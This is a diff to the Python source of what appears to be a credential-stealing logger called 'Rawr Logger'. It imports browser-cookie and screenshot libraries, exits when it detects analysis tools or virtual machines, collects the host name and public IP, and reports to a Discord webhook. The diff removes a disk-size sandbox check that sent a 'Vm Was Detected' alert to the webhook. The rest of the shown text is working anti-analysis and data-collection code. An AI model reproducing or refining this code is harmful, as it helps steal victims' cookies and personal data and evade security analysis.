@@ -1,11 +1,10 @@
-import os,requests,socket,threading,platform,json,psutil,sys,win32process
+import os,requests,socket,threading,platform,json,psutil
 import browser_cookie3
 import cv2
 import re, uuid
 from pystyle import *
 from PIL import ImageGrab
 os.system('cls')
-webhook = "Webhooksss"
 print("Loading Client..")
 process = [
     "ProcessHacker.exe",
@@ -31,33 +30,8 @@ vm = ["VMwareService.exe", "VMwareTray.exe","joeboxcontrol.exe,vmwareuser.exe"]
 for proc in psutil.process_iter():
         if proc.name() in vm:
             exit()
-minDiskSizeGB = 50
-if len(sys.argv) > 1: minDiskSizeGB = float(sys.argv[1])
-_, diskSizeBytes, _ = win32process.GetDiskFreeSpaceEx()
-diskSizeGB = diskSizeBytes/1073741824
 
-if diskSizeGB < minDiskSizeGB:
-    try:
-
-        embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
-                      "embeds": [
-                {
-                    "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
-                    },
-                    "description": f"```Vm Was Detected```",                       
-                    "footer": {
-                      "text": "Rawr Logger Made By Jose And The Soap1"
-                    }
-                }
-            ]
-
-        }
-        requests.post(webhook, json=embedss) 
-        sys.exit
-    except:
-        pass
+webhook = "Webhooksss"
 machines = platform.uname()
 hostnames = socket.gethostname()  
 ips = requests.get('https://api.ipify.org').text
